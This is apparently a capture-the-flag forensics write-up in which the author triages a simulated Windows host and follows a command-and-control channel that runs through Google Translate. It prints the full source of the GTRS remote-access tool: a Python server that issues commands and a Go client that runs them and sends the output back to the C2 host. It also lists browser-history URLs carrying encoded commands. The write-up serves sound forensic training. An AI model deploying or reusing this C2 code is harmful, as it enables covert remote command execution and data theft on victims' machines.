## Chall description
```
We had a lot of fun helping the Internet understand what MDRs are, but we thought of the next the best thing:
why not have you use one! 😄

A host that you protect had some strange alerts fire off... can you analyze and triage to find other malicious activity?
```

## Procedure
After start the chall we can see 2 alerts, the chall talks about malicious activity, the files was on `Downloads` folder, let's start watching this folder.
```
HackTool:Win32
Severe
Detected by: Real-time protection
Object: C:\\Users\\Administrator\\Downloads\\GTRS-main.zip
Action: Removed
Time: 2025-09-29 10:12:03

HackTool:Win32
High
Detected by: On-demand scan
Object: C:\\Users\\Administrator\\Downloads\\BabyShark-main.zip
Action: Removed
Time: 2025-09-29 09:45:41
```

We can see a reference to `GTRS-1.tar.gz` file, let's download the file to inspect.
<img width="1232" height="292" alt="Screenshot 2025-10-19 at 1 05 29 PM" src="https://github.com/user-attachments/assets/446bc452-6f0e-4200-a82b-6e208a0cc3d6" />

```
tree .
.
├── Makefile
├── README.md
├── client.go
├── client.sh
└── server.py

1 directory, 5 files
```

```python
#### server.py
#!/usr/bin/python

from uuid import uuid4
from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer

serverPort = 80
secretkey = str(uuid4())

class webServer(BaseHTTPRequestHandler):

    def do_GET(self,):
        useragent = self.headers.get('User-Agent').split('|')
        querydata = parse_qs(urlparse(self.path).query)
        if 'key' in querydata:
            if querydata['key'][0] == secretkey:
                self.send_response(200)
                self.send_header("Content-type","text/html")
                self.end_headers()

                if len(useragent) == 2:
                    response = useragent[1].split(',')[0]
                    print(response.decode("base64"))
                    self.wfile.write("Not Found")
                    return
                cmd = raw_input("$ ")
                self.wfile.write("STARTCOMMAND{}ENDCOMMAND".format(cmd))
                return
        self.send_response(404)
        self.send_header("Content-type","text/html")
        self.end_headers()
        self.wfile.write("Not Found")
        return

    def log_message(self, format, *args):
        return

try:
    server = HTTPServer(("", serverPort), webServer)
    print("Server running on port: {}".format(serverPort))
    print("Secret Key: {}".format(secretkey))
    server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()
```

```go
// client.go
package main

import (
  "bytes"
  "encoding/base64"
  "fmt"
  "log"
  "net/http"
  "os"
  "os/exec"
  "runtime"
  "strings"
  "github.com/antchfx/htmlquery"
  "golang.org/x/net/html"
  "golang.org/x/net/html/charset"
)

type requestData struct {
  url       string
  userAgent string
  method    string
}

var C2URL string
var USERAGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
var RESULT string

func xpathParser(html *html.Node, xpath string) string {
  a := htmlquery.FindOne(html, xpath)
  return htmlquery.InnerText(a)
}

func Encode(data []byte) string {
  return base64.StdEncoding.EncodeToString(data)
}

func parseCommand(command string) string {
  if strings.Contains(command, "STARTCOMMAND") {
    startIndex := strings.Index(command, "STARTCOMMAND")
    endIndex := strings.Index(command, "ENDCOMMAND")
    return command[startIndex+len("STARTCOMMAND") : endIndex]
  } else {
    return ""
  }
}

func doRequest(request requestData, printar bool) (*html.Node, error) {
  client := http.Client{}
  req, err := http.NewRequest(request.method, request.url, nil)
  req.Header.Add("User-Agent", request.userAgent)
  resp, err := client.Do(req)
  if err != nil {
    return nil, err
  }
  r, err := charset.NewReader(resp.Body, resp.Header.Get("Content-Type"))
  if err != nil {
    return nil, err
  }
  return html.Parse(r)
}

func interact(request requestData) *html.Node {
  resp, err := doRequest(request, false)
  if err != nil {
    fmt.Println(err)
  }
  return resp
}

func translateFlow() string {
  return thirdStep(secondStep(firstStep()))
}

func firstStep() string {
  request := requestData{
    url:       "https://translate.google.com/translate?&anno=2&u=" + C2URL,
    userAgent: USERAGENT,
    method:    "GET",
  }
  result := xpathParser(interact(request), "//iframe/@src")
  return result

}

func secondStep(url string) string {
  request := requestData{
    url:       url,
    userAgent: USERAGENT,
    method:    "GET",
  }

  result := xpathParser(interact(request), "//a/@href")
  return result
}

func thirdStep(url string) string {
  var useragent string
  if len(RESULT) != 0 {
    useragent = RESULT
  } else {
    useragent = USERAGENT
  }

  request := requestData{
    url:       url,
    userAgent: useragent,
    method:    "GET",
  }

  var b bytes.Buffer
  html.Render(&b, interact(request))
  return parseCommand(b.String())
}

func execCommand(cmd string) {
  var output []byte
  if runtime.GOOS == "windows" {
    output, _ = exec.Command("cmd", "/c", cmd).Output()
  } else {
    output, _ = exec.Command("bash", "-c", cmd).Output()
  }

  RESULT = USERAGENT + " | " + Encode(output)
  translateFlow()
}

func main() {
  args := os.Args
  if len(args) < 3 {
    log.Fatal("Usage Error\n" + args[0] + " www.c2server.ml secret-key")
  }
  key := args[2]
  C2URL = "http://" + args[1] + "/?key=" + key
  for {
    execCommand(translateFlow())
    RESULT = ""
  }
}
```

This `client.go`, try to communicate to server via google translate, using `HTTP GET` requests. another interesting thing is a parser command in the golang code
```go
func parseCommand(command string) string {
  if strings.Contains(command, "STARTCOMMAND") {
    startIndex := strings.Index(command, "STARTCOMMAND")
    endIndex := strings.Index(command, "ENDCOMMAND")
    return command[startIndex+len("STARTCOMMAND") : endIndex]
  } else {
    return ""
  }
}
```

After a moment I decided to extract the History from Google into `C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History`.
<img width="1223" height="265" alt="Screenshot 2025-10-19 at 8 58 50 AM" src="https://github.com/user-attachments/assets/6a8600a9-9d80-4051-815a-b4f14d3c70d0" />

This is a `sqlite` database, let's start extracting the urls from it. use `sql3 History`, then `Select url from urls;`
```
SQLite version 3.43.2 2023-10-10 13:08:14
Enter ".help" for usage hints.
sqlite> select url from urls;
http://ctf.huntress.com/
http://google.com/
https://ctf.huntress.com/
https://ctf.huntress.com/faq
https://ctf.huntress.com/prizes
https://ctf.huntress.com/rules
https://discord.com/invite/zMGs6khZpa
https://discord.gg/zMGs6khZpa
https://freenom.com/
https://github.com/UnkL4b/BabyShark
https://github.com/UnkL4b/BabyShark/blob/master/app.py
https://github.com/UnkL4b/BabyShark?tab=readme-ov-file
https://github.com/mthbernardes/GTRS
https://github.com/mthbernardes/GTRS/blob/master/utils/inmemory-linux.py
https://github.com/mthbernardes/GTRS/releases
https://github.com/mthbernardes/GTRS/releases/tag/v1
https://github.com/mthbernardes/GTRS?tab=readme-ov-file
https://google.com/
https://lolc2.github.io/
https://mthbernardes.github.io/rce/2018/12/14/hosting-malicious-payloads-on-youtube.html
https://translate.google.com/
https://translate.google.com/?hl=en&tab=TT
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%CE%A4%CE%B1%20%CE%BC%CE%B5%CE%B3%CE%AC%CE%BB%CE%B1%20%CF%84%CE%B1%CE%BE%CE%AF%CE%B4%CE%B9%CE%B1%20%CE%B1%CF%81%CF%87%CE%AF%CE%B6%CE%BF%CF%85%CE%BD%20%CE%BC%CE%B5%20%CE%AD%CE%BD%CE%B1%20%CE%BC%CE%B9%CE%BA%CF%81%CF%8C%20%CE%B2%CE%AE%CE%BC%CE%B1%20%E2%80%94%20%CE%BC%CE%B7%20%CF%86%CE%BF%CE%B2%CE%AC%CF%83%CE%B1%CE%B9%20%CF%84%CE%BF%20%CF%80%CF%81%CF%8E%CF%84%CE%BF.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%D0%9B%D1%83%D1%87%D1%88%D0%B5%20%D0%BE%D0%B4%D0%B8%D0%BD%20%D1%80%D0%B0%D0%B7%20%D1%83%D0%B2%D0%B8%D0%B4%D0%B5%D1%82%D1%8C%2C%20%D1%87%D0%B5%D0%BC%20%D1%81%D1%82%D0%BE%20%D1%80%D0%B0%D0%B7%20%D1%83%D1%81%D0%BB%D1%8B%D1%88%D0%B0%D1%82%D1%8C%20%E2%80%94%20%D0%BF%D1%83%D1%82%D0%B5%D1%88%D0%B5%D1%81%D1%82%D0%B2%D0%B8%D1%8F%20%D1%83%D1%87%D0%B0%D1%82%20%D0%BB%D1%83%D1%87%D1%88%D0%B5%20%D0%B2%D1%81%D0%B5%D0%B3%D0%BE.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%D7%90%D7%99%D7%9F%20%D7%93%D7%91%D7%A8%20%D7%94%D7%A2%D7%95%D7%9E%D7%93%20%D7%91%D7%A4%D7%A0%D7%99%20%D7%94%D7%A8%D7%A6%D7%95%D7%9F%20%E2%80%94%20%D7%A8%D7%A7%20%D7%94%D7%AA%D7%9E%D7%93%D7%94%20%D7%95%D7%AA%D7%A7%D7%95%D7%95%D7%94%20%D7%9E%D7%A0%D7%A6%D7%97%D7%99%D7%9D%20%D7%91%D7%A1%D7%95%D7%A3.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%D9%84%D9%8A%D8%B3%20%D9%83%D9%84%20%D9%85%D8%A7%20%D9%8A%D9%84%D9%85%D8%B9%20%D8%B0%D9%87%D8%A8%D9%8B%D8%A7%D8%9B%20%D8%A7%D9%84%D9%82%D9%8A%D9%85%20%D8%A7%D9%84%D8%AD%D9%82%D9%8A%D9%82%D9%8A%D8%A9%20%D8%AA%D8%B8%D9%87%D8%B1%20%D9%81%D9%8A%20%D8%A7%D9%84%D8%A3%D9%81%D8%B9%D8%A7%D9%84%20%D8%A7%D9%84%D9%8A%D9%88%D9%85%D9%8A%D8%A9.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%E0%A4%9C%E0%A4%B9%E0%A4%BE%E0%A4%81%20%E0%A4%9A%E0%A4%BE%E0%A4%B9%20%E0%A4%B5%E0%A4%B9%E0%A4%BE%E0%A4%81%20%E0%A4%B0%E0%A4%BE%E0%A4%B9%20%E2%80%94%20%E0%A4%95%E0%A4%A0%E0%A4%BF%E0%A4%A8%E0%A4%BE%E0%A4%87%E0%A4%AF%E0%A4%BE%E0%A4%81%20%E0%A4%86%E0%A4%A4%E0%A5%80%20%E0%A4%B9%E0%A5%88%E0%A4%82%2C%20%E0%A4%AA%E0%A4%B0%20%E0%A4%B9%E0%A4%BF%E0%A4%AE%E0%A5%8D%E0%A4%AE%E0%A4%A4%20%E0%A4%B0%E0%A4%96%E0%A5%87%E0%A4%82%20%E0%A4%A4%E0%A5%8B%20%E0%A4%9C%E0%A5%80%E0%A4%A4%20%E0%A4%86%E0%A4%AA%E0%A4%95%E0%A5%80%20%E0%A4%B9%E0%A5%88%E0%A5%A4&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%E4%B8%8D%E7%BB%8F%E5%8E%86%E9%A3%8E%E9%9B%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E8%A7%81%E5%BD%A9%E8%99%B9%EF%BC%9F%E5%8A%AA%E5%8A%9B%E6%80%BB%E4%BC%9A%E6%9C%89%E5%9B%9E%E6%8A%A5%E3%80%82&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%E7%9F%B3%E3%81%AE%E4%B8%8A%E3%81%AB%E3%82%82%E4%B8%89%E5%B9%B4%20%E2%80%94%20%E7%B6%99%E7%B6%9A%E3%81%AF%E5%8A%9B%E3%81%AA%E3%82%8A%E3%80%81%E4%BB%8A%E6%97%A5%E3%82%82%E4%B8%80%E6%AD%A9%E5%89%8D%E3%81%B8%E3%80%82&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%EB%B0%B0%EC%9B%80%EC%97%90%EB%8A%94%20%EB%81%9D%EC%9D%B4%20%EC%97%86%EB%8B%A4%20%E2%80%94%20%EC%9E%91%EC%9D%80%20%ED%98%B8%EA%B8%B0%EC%8B%AC%EC%9D%B4%20%ED%81%B0%20%EB%B3%80%ED%99%94%EB%A5%BC%20%EB%A7%8C%EB%93%A0%EB%8B%A4.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=A%20vida%20%C3%A9%20como%20um%20rio%3A%20%C3%A0s%20vezes%20calma%2C%20%C3%A0s%20vezes%20turbulenta%2C%20sempre%20em%20frente.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Aunque%20la%20monta%C3%B1a%20sea%20alta%2C%20paso%20a%20paso%20se%20llega%20a%20la%20cima.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Borta%20bra%20men%20hemma%20b%C3%A4st%20%E2%80%94%20ibland%20beh%C3%B6ver%20man%20vila%20p%C3%A5%20sin%20egen%20plats.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Der%20fr%C3%BChe%20Vogel%20f%C3%A4ngt%20den%20Wurm%2C%20doch%20Geduld%20bringt%20Rosen.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=G%C3%BCne%C5%9F%20her%20sabah%20do%C4%9Far%3B%20d%C3%BCn%C3%BC%20b%C4%B1rak%2C%20bug%C3%BCn%C3%BC%20kucakla%20ve%20ileri%20bak.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=M%C6%B0a%20d%E1%BA%A7m%20th%E1%BA%A5m%20l%C3%A2u%20%E2%80%94%20vi%E1%BB%87c%20nh%E1%BB%8F%20nh%C6%B0ng%20%C4%91%E1%BB%81u%20%C4%91%E1%BA%B7n%20s%E1%BA%BD%20mang%20k%E1%BA%BFt%20qu%E1%BA%A3%20l%E1%BB%9Bn.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Nie%20oceniaj%20ksi%C4%85%C5%BCki%20po%20ok%C5%82adce%20%E2%80%94%20ka%C5%BCdy%20ma%20swoj%C4%85%20histori%C4%99%20i%20ciche%20bitwy.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Non%20tutte%20le%20ciambelle%20escono%20col%20buco%3B%20impariamo%20dagli%20errori%20e%20andiamo%20avanti.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Rumahku%20adalah%20istanaku%2C%20tetapi%20dunia%20menunggu%20di%20luar%3B%20jaga%20keseimbangan&op=translatehttps://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=%E0%B8%84%E0%B8%A7%E0%B8%B2%E0%B8%A1%E0%B8%9E%E0%B8%A2%E0%B8%B2%E0%B8%A2%E0%B8%B2%E0%B8%A1%E0%B8%AD%E0%B8%A2%E0%B8%B9%E0%B9%88%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B9%84%E0%B8%AB%E0%B8%99%20%E0%B8%84%E0%B8%A7%E0%B8%B2%E0%B8%A1%E0%B8%AA%E0%B8%B3%E0%B9%80%E0%B8%A3%E0%B9%87%E0%B8%88%E0%B8%AD%E0%B8%A2%E0%B8%B9%E0%B9%88%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B8%B1%E0%B9%88%E0%B8%99%20%E2%80%94%20%E0%B8%AD%E0%B8%A2%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B8%AD%E0%B8%A1%E0%B9%81%E0%B8%9E%E0%B9%89%E0%B8%81%E0%B9%88%E0%B8%AD%E0%B8%99%E0%B8%88%E0%B8%B0%E0%B8%A5%E0%B8%AD%E0%B8%87%E0%B9%80%E0%B8%95%E0%B9%87%E0%B8%A1%E0%B8%97%E0%B8%B5%E0%B9%88.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2B%3CWES%3D%265M%3A6YF%3BPH%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C%3BF5T%3CW1A%3D%22%60M86(*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C%3BF5T(%27-E%3CW-I%3BVX*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C9W!R97-U%3B%270%40%2BW(*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%3A9G-U%3D%26EL(%279O%3B%275M92!D%3A7-K9G)E92!%23.%40H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%3C%3CV-H%3D%26%25S%3AW%2C%40%2BW%25U97)Y(%22%5DF%3BR!%2C25-4(%22%5DV%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%3C9%26ER(%22%5DA(%22%5DS(%22)%23.E!R%3BV%3DR86T%401FEL97%2CB%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%3E%3BF5T(%26QO8V%25L9W)O%3D7%60%40861M%3A6YI%3CW1R871O%3CG%2C*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%3E%3BG-L%3BV%5DK%3D7%60%40%2B71Y%3C%264%5D86YY(%26%3DO%3BV%3DL92YC%3BVT*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A)%3BF5T(%275S97(*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A)%3CV%2C%40%3C75E%3CGD*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A*%3BF5T(%27-H87)E%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A-%3BF5T%3CW1A%3D%22%60M86YO%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A.%3A7!C%3BVYF%3A6%3C%40%2BV%25L%3B%60H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A.%3D%26%25S%3AVQI%3CW0%40%2BW-V8PH%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A3%3CV%2C%40%3C6%2C%40%3B%26%25N%3B6%25N%3CV5R%3DF5R%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AA%3DV5V%3D%275T%3A6P%40%3C64%404WES%3D%265M(%22%5DC.C%24P(%22%5DF.G1E%3E%270*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AC%3DVUI8R!B%3A6%5DS(%26%3DE%3D%22!S97)I86QN%3D6UB97(L%3DF5R%3CVEO%3B%40H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AE9%26ER(%24%2CZ(%22%5DS(%22%5DB(%27P%409FEN9%27-T%3CB%60O%3A2%60B%3C%26%25S%3CW%3DO%3CF0B%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AF%3BF5T(%26QO8V%25L9W)O%3D7%60%40(E)E%3B6%5DT92!%2497-K%3D%26%5DP(%255S97)S(%40H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AH%3A6-A8VQS(%24%2CZ5VEN9%26%5DW%3CU-Y%3CW1E%3B3%2CR9%27)I%3DF5R%3CV5T8VAO%3CW1S%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AL%3DVUI8R!P%3CF%5DC97-S(%26%3DE%3D%22!0%3CF%5DC97-S260L3F%25M92Q%23%3BVUM86YD3%26EN90H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AM%3CF5G(%27%25U97)Y(%22)(2TQ-4T%5D%265%25%3D!4D5-%3A6-R%3BW-O9G17%3A6YD%3BW%3DS0W5R%3CF5N%0A0%3D%259E%3CG-I%3BVY2%3D6XB(%22%5DS%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AM%3CV5C961I%3D%22%60O97AP%3BW)T(%22%5DC9F%3C%400SI7%3A6YD%3BW%3DS5%265M%3C%27-E8W!O%3B%22YC9F%3C*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AM%3DVUI8R!L%3BV%3DI8V%25L9%26ES%3AR!G970%40%3BF%25M92QS%3A7IE%2B%269R965S%3C%26%25C92QP%3CF%5DV%0A)%3A61E%3CFYA%3B64*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AM871T%3CFEB(%22US(%22UH(%24%2CZ5VEN9%26%5DW%3CU-Y%3CW1E%3B3%2CR9%27)I%3DF5R%3CV5T8VAO%3CW1S%0A!%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AM96-H%3BR%60E55-%254DY!344E(%228F(%265C%3A%26%5C%40)55315)%243TU!24XE(%228F(%265C%3A%26%5C%40%0A%2F)4-%2F35!55%24523D%25-124*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Wie%20het%20kleine%20niet%20eert%2C%20is%20het%20grote%20niet%20weerd%20%E2%80%94%20begin%20met%20kleine%20gewoonten.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=en&tl=es&text=STARTCOMMAND%0Abegin%20664%20-%0A39V5T%3B6%25C(%22%5DV(%22%5DF%3BR!L%3A7-T%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2787)P(%22UA%22%40%60%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C%3CF%5DU%3D%264%40%3C%27)I%3BG0*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A2%3C%26EN9R%60M%3BB%60T(%23%40N.%22XX%2BC%40*%0A%60%0Aend%0AENDCOMMAND%0A&op=translatehttps://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A3%3D%27)
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0AL96-H%3BR!F%3B%26%25G%3ES8Y%2CC%60P8S%24S9%26-B%2CSED93%24Y830P-64Y9%23%25F.3DS.%23(Q%3F0H%60%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=pt&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A5%3A7!C%3BVYF%3A6%3C%40%2BV1I%3CW!L87ED%3BG%2C*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?hl=en&tab=TT&tab=TT&sl=auto&tl=en&text=Rumahku%20adalah%20istanaku%2C%20tetapi%20dunia%20menunggu%20di%20luar%3B%20jaga%20keseimbangan&op=translate
https://translate.google.com/?hl=en&tab=TT&tab=TT&sl=es&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A2%3C%26EN9R%60M%3BB%60T(%23%40N.%22XX%2BC%40*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?sl=auto&tl=en&op=translate
https://translate.google.com/?sl=auto&tl=en&text=Quand%20on%20veut%2C%20on%20peut%20%E2%80%94%20il%20suffit%20de%20pers%C3%A9v%C3%A9rer%20et%20de%20garder%20le%20cap.&op=translate
https://translate.google.com/?sl=auto&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C%3D%26%25S%3AVQI%3CW0%40%2BW8*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://translate.google.com/?sl=pt&tl=en&text=STARTCOMMAND%0Abegin%20664%20-%0A%2C%3DVAO86UI(%22%5DA%3B%26P*%0A%60%0Aend%0AENDCOMMAND%0A&op=translate
https://www.freenom.com/en/index.html?lang=en
https://www.google.com/
https://www.google.com/?zx=1759167619067&no_sw_cr=1
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&google_abuse=GOOGLE_ABUSE_EXEMPTION%3DID%3D6f836c6faf2940ef:TM%3D1759167622:C%3DR:IP%3D3.225.222.31-:S%3DIxFMj-OHSm7BM9jl6VZetr4%3B+path%3D/%3B+domain%3Dgoogle.com%3B+expires%3DMon,+29-Sep-2025+20:40:22+GMT&sg_ss=*sY2ajdXyAAb17ckR1e19xoshSE2V4ZgEADQBEArZ1NTCS_dSoMuWriJofvC-lTeJ0P1ZY88dwq7_cWN7bc6ZRk-XHAM5sEGg35Vw8ITiPQAAAHZtAAAAFFcBB0EANaiwmtpOq869PYTswVQqHza2mKbK9CLmheRGXJoYw74VAJsuOeHDOaZdJ8_2broGfLTCpjFGNQBfe8KGMKMY-E471WKloYsXxh0bSneZCWcHzve4cg8rFa1tenJz3Srkl2egVkLsK_gMja5NQClOQ-TuVjosdZNPijoCGptQZxAkrnClGVhMlL48WDybq2eohDRZfolrRiSmAkuhc5iGNPIV3lv4eoXYKSTuRJrNrhZc4MmqHekNVZDZeJlifLOmF1EK7ZQz4dJ1c2qc6vsv-97-c9NZZRRCSP1JOiuK1eP0nhLBny